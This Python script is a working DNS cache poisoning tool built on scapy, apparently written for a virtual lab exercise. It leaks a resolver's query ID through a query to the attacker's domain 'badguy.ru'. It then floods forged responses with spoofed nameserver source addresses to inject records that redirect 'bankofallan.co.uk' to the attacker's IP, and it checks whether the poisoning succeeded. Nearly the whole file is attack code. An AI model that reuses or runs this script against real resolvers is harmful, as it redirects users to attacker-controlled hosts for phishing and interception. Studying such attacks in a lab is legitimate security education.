#! /usr/bin/env python3

import dns.resolver
from dns.resolver import NoAnswer

import multiprocessing
import random #For generating random ID

from scapy import *
from scapy.all import *
import scapy.layers.l2
import time
import socket
import sys
import signal

from blessings import Terminal #For terminal threading


from multiprocessing.pool import ThreadPool
import logging
import threading

#TODO: Check if the victim server is authoritative, because in this case the attack cannot be carried on
#TODO: Check if the victim use recursive query resolution, otherwise the attac k will not work



def get_id(udp_ip, udp_port):

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
    sock.bind((udp_ip, udp_port))

    print("Listening for incoming DNS request...")

    while True:
        data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
        print("Received response:", data)
        received_id = data[0:2]

        initial_id = int.from_bytes(received_id, byteorder='big')

        print("RAW ID: ", received_id)
        print("ID: ", initial_id)

        sock.close()

        return initial_id
   


def sigint_handler(sig, frame):
    print("Exiting...")
    sys.exit(0)


class DNSPoisoning:


    def __init__(self, victim_server, spoofed_domain, attacker_ip, authoritative_nameserver, initial_id, interrupt_handler=None):
        self.victim_server = victim_server
        self.spoofed_domain = spoofed_domain
        self.attacker_ip = attacker_ip
        self.id = initial_id
        self.sport = 53
        self.flood_socket = None
        self.auth_nameserver = authoritative_nameserver
        self.flood_pool = None


        self.interrupt_handler = interrupt_handler


        self.invalid_url = str(random.randint(10,200)) + '.' + self.spoofed_domain

        print("Invalid URL used: ", self.invalid_url)



    def send_crafted_packet(self, id_req):

        # To generate a valid request we should:
        # 1) responses should come from the same dest port (53)
        # 2) Question should match the query section
        # 3) Query ID should match
        #
        # Use Default DNS port as default source port    
        #
        # DNS Request:  
        #   -) ID
        #   -) Question
        #   -) 
        #
        #
        
        #print("Using ID: " + str(id_req), end='') 
            
        #First type of attack
        crafted_response_1 = IP(dst=victim_server_ip, src=self.auth_nameserver)\
            /UDP(dport=53, sport=53)\
                /DNS(id=id_req,\
                    qr=1,\
                    rd=1,\
                    ra=1,\
                    aa=1,\
                    nscount=1,\
                    arcount=1,\
                    ancount=1,\
                    qdcount=1,\
                    qd=DNSQR(qname=self.invalid_url, qtype="A"),\
                    an=DNSRR(rrname=self.invalid_url, type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip)/\
                    DNSRR(rrname='ns.badguy.ru', type='NS', rclass='IN', ttl=70000, rdata=self.attacker_ip),\
                    ar=DNSRR(rrname='ns.badguy.ru', type='NS', rclass='IN', ttl=70000, rdata=self.attacker_ip),\
                    #an=DNSRR(rrname="ns." + self.spoofed_domain, type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip),\
                    #ar2=DNSRR(rrname='ns.' + self.spoofed_domain, type='NS', rclass='IN', ttl=70000, rdata=self.attacker_ip),\
                    ns=DNSRR(rrname=self.spoofed_domain, rclass=1, ttl=70000, rdata="ns.badguy.ru", type=2)\
                )

        #Second type of attack
        crafted_response_2 = IP(dst=victim_server_ip, src=self.auth_nameserver)\
            /UDP(dport=53, sport=53)\
                /DNS(id=id_req,\
                    qr=1,\
                    aa=1,\
                    ra=0,\
                    rd=0,\
                    nscount=1,\
                    arcount=1,\
                    ancount=0,\
                    qdcount=1,\
                    qd=DNSQR(qname=self.invalid_url, qtype="A"),\
                    an=None,\
                    ns=DNSRR(rrname=self.invalid_url ,type='NS', rclass=1, ttl=70000, rdata="ns.badguy.ru"),\
                    ar=(DNSRR(rrname='ns.badguy.ru', type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip))
                )

        self.flood_socket.send(crafted_response_2)

    def send_inital_query(self):
        #self.sport = random.randint(1024, 65536)

        logging.info("Used ID %d", self.id)

        query = IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(rd=1,qd=DNSQR(qname=self.invalid_url))

        send(query)


    def start_flooding(self):

        number_of_guess = 200

        spacing = 800

        #Craft the packet

        id_range = range(self.id + spacing,self.id + spacing + number_of_guess)

        print("Using ID from {t.bold}{initial}{t.normal} to {t.bold}{final}{t.normal}".format(t=term, initial=self.id + spacing, final=self.id + spacing + number_of_guess))

        #Taken from that: https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html 
        print("Opening socket for faster flood...")
        self.flood_socket = conf.L3socket(iface='vboxnet0') #TODO: Put this in the parameter

        self.flood_pool = ThreadPool(number_of_guess)

        result = self.flood_pool.map(self.send_crafted_packet, id_range)
        self.flood_pool.close()

        self.flood_pool.join()
        self.flood_socket.close()
        print("Flood finished")



    def check_poisoning(self):
        # check to see if it worked
        # ask the victim for the IP of the domain we are trying to spoof
        try:
            pkt = sr1(IP(dst=self.victim_server) / UDP(sport=53, dport=53) / DNS(qr=0, qd=DNSQR(qname=self.spoofed_domain, qtype='A')), verbose=True, iface='vboxnet0', timeout=10)
            print("Answer arrived")
            if pkt[DNS].an and pkt[DNS].an.rdata:
                actualAnswer = str(pkt[DNS].an.rdata)
                # if the IP is our IP, we poisoned the victim
                if actualAnswer == self.attacker_ip:
                    return True
            return False
        except:
            return False


    def stop_handler(self, sig, frame):
        print("Closing socket")
        self.flood_socket.close()
        self.flood_pool.terminate()
        print("Cache poisoning stopped")

        if self.interrupt_handler  != None:     #If an interrupt handler is passed
            signal.signal(signal.SIGINT, self.interrupt_handler)    #Set it as a new SIGINT handler

        

def first_stage(victim_server_ip):

    victim_server = dns.resolver.Resolver()
    victim_server.nameservers = [victim_server_ip]

    try:
        myAnswers = victim_server.query("badguy.ru", "A")
        for rdata in myAnswers:
                print(rdata)
    except:
        print("{t.red}{t.bold}Query failed{t.normal}".format(t=term))



term = Terminal()

print("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n".format(t=term))





victim_server_ip = '192.168.56.3'

#Bad Guy
bad_udp_port = 55553
bad_udp_ip = '192.168.56.1'


number_of_tries = 20
succeded = False

while number_of_tries and not succeded:

    print("\n ------ {t.bold}{t.shadow}Attack Number {num}{t.normal} ------\n".format(t=term, num=abs(number_of_tries-20)))


    pool = ThreadPool(processes=1)

    print("Starting DNS light server")
    async_result = pool.apply_async(get_id, (bad_udp_ip, bad_udp_port)) # tuple of args for foo

    time.sleep(2)

    print("\n\nStart sending the first request to \"{t.italic}badguy.ru{t.normal}\"".format(t=term))
    first_stage(victim_server_ip) #Start the DNS listening server

    fetched_id = async_result.get()  # get the return value from your function.

    print("Fetched ID: {t.green}{t.bold}{id}{t.normal}".format(t=term, id=fetched_id))

    print("Ok, the victim does not know the attack, let's try to perform \"{t.italic}Dan's Shenanigans{t.normal}\"".format(t=term))

    poison= DNSPoisoning(victim_server_ip, "bankofallan.co.uk", '192.168.56.1', '10.0.0.1', fetched_id, sigint_handler)

    #Attach SIGINT signal to the DNSPoisoning stop handler
    signal.signal(signal.SIGINT, poison.stop_handler)


    poison.send_inital_query()

    print("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...".format(t=term))

    poison.start_flooding()

    time.sleep(3)

    print("Checking the attack results")
    if poison.check_poisoning():
        print("\n\nAttack Succeded!!!!")
        succeded = True
    else:
        print("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!".format(t=term))
        number_of_tries = number_of_tries - 1